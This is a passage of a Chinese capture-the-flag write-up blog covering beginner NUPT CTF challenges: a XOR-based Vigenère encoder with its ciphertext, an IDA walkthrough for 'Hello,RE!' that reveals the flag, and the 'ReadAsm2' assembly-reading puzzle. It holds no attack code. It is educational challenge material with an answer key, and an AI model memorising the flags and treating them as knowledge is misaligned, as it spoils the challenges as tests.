</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-37>37</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>http:<span style=color:#75715e>//ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define KEY_LENGTH 2 </span><span style=color:#75715e>// Can be anything from 1 to 13
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> ch;
</span></span><span style=display:flex><span>  FILE <span style=color:#f92672>*</span>fpIn, <span style=color:#f92672>*</span>fpOut;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> key[KEY_LENGTH] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>};
</span></span><span style=display:flex><span>  <span style=color:#75715e>/* of course, I did not use the all-0s key to encrypt */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  fpIn <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;ptext.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  fpOut <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;ctext.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (<span style=color:#a6e22e>fscanf</span>(fpIn, <span style=color:#e6db74>&#34;%c&#34;</span>, <span style=color:#f92672>&amp;</span>ch) <span style=color:#f92672>!=</span> EOF) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* avoid encrypting newline characters */</span>  
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* In a &#34;real-world&#34; implementation of the Vigenere cipher, 
</span></span></span><span style=display:flex><span><span style=color:#75715e>       every ASCII character in the plaintext would be encrypted.
</span></span></span><span style=display:flex><span><span style=color:#75715e>       However, I want to avoid encrypting newlines here because 
</span></span></span><span style=display:flex><span><span style=color:#75715e>       it makes recovering the plaintext slightly more difficult... */</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* ...and my goal is not to create &#34;production-quality&#34; code =) */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ch<span style=color:#f92672>!=</span><span style=color:#e6db74>&#39;\n&#39;</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(fpOut, <span style=color:#e6db74>&#34;%02X&#34;</span>, ch <span style=color:#f92672>^</span> key[i <span style=color:#f92672>%</span> KEY_LENGTH]); <span style=color:#75715e>// ^ is logical XOR    
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      i<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fclose</span>(fpIn);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fclose</span>(fpOut);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#f92672>----------------------------------------------------------------------------------</span>
</span></span><span style=display:flex><span>http:<span style=color:#75715e>//ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794
</span></span></code></pre></td></tr></table></div></div><p>详见 <a href=https://findneo.github.io/2017/10/nupt-vigenere/>南邮CTF平台 Vigenere writeup</a> 。</p><h3 id=逆向>逆向<a hidden class=anchor aria-hidden=true href=#逆向>#</a></h3><h4 id=hellore>Hello,RE!<a hidden class=anchor aria-hidden=true href=#hellore>#</a></h4><blockquote><p>或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了
PS:IDA里面按R可以把奇怪的数字变成字符串</p><p>格式为<code>flag{*****}</code>包含flag{}提交</p><p>参考资料：
《IDA Pro 权威指南》
各种CTF比赛的逆向部分的writeup</p><p><a href=1.zip>1.exe</a></p></blockquote><p>拖进IDA，定位到main函数，按F5反编译。对着V5~V10逐个按R将十六进制转为字符串即可。<code>flag{Welcome_To_RE_World!}</code></p><p><img loading=lazy src=0d64bc04cf30ea7db.png alt></p><h4 id=readasm2>ReadAsm2<a hidden class=anchor aria-hidden=true href=#readasm2>#</a></h4><blockquote><p>读汇编是逆向基本功。</p><p>给出的文件是func函数的汇编
main函数如下
输出的结果即为flag，格式为<code>flag{**********}</code>，请连flag{}一起提交</p><p>编译环境为linux gcc x86-64
调用约定为System V AMD64 ABI
<strong>请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力</strong></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>int main(int argc, char const *argv[])
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,
</span></span><span style=display:flex><span>                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,
</span></span><span style=display:flex><span>                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};
</span></span><span style=display:flex><span>  func(input, 28);
</span></span><span style=display:flex><span>  printf(&#34;%s\n&#34;,input+1);
</span></span><span style=display:flex><span>  return 0;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>参考资料:
<a href=https://github.com/veficos/reverse-engineering-for-beginners>https://github.com/veficos/reverse-engineering-for-beginners</a>
《汇编语言》王爽
《C 反汇编与逆向分析技术揭秘》</p><p><a href=2.asm>2.asm</a> :</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-26>26</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>00000000004004e6 &lt;func&gt;:
</span></span><span style=display:flex><span>  4004e6: 55                    push   rbp
</span></span><span style=display:flex><span>  4004e7: 48 89 e5              mov    rbp,rsp
</span></span><span style=display:flex><span>  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi
</span></span><span style=display:flex><span>  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi
</span></span><span style=display:flex><span>  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1
</span></span><span style=display:flex><span>  4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;
</span></span><span style=display:flex><span>  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]
</span></span><span style=display:flex><span>  4004fd: 48 63 d0              movsxd rdx,eax
</span></span><span style=display:flex><span>  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]
</span></span><span style=display:flex><span>  400504: 48 01 d0              add    rax,rdx
</span></span><span style=display:flex><span>  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]
</span></span><span style=display:flex><span>  40050a: 48 63 ca              movsxd rcx,edx
</span></span><span style=display:flex><span>  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]
</span></span><span style=display:flex><span>  400511: 48 01 ca              add    rdx,rcx
</span></span><span style=display:flex><span>  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]
</span></span><span style=display:flex><span>  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]
</span></span><span style=display:flex><span>  40051a: 31 ca                 xor    edx,ecx
</span></span><span style=display:flex><span>  40051c: 88 10                 mov    BYTE PTR [rax],dl
</span></span><span style=display:flex><span>  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1
</span></span><span style=display:flex><span>  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]
</span></span><span style=display:flex><span>  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]
</span></span><span style=display:flex><span>  400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;
</span></span><span style=display:flex><span>  40052a: 90                    nop
</span></span><span style=display:flex><span>  40052b: 5d                    pop    rbp
</span></span><span style=display:flex><span>  40052c: c3                    ret
</span></span></code></pre></td></tr></table></div></div></blockquote></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/170926hexoconfig/><span class=title>« Prev</span><br><span>博客搭建与自定义</span></a>
<a class=next href=https://ret2neo.cn/post/160820whuojstarter/><span class=title>Next »</span><br><span>武汉大学C语言上机训练系统练习</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>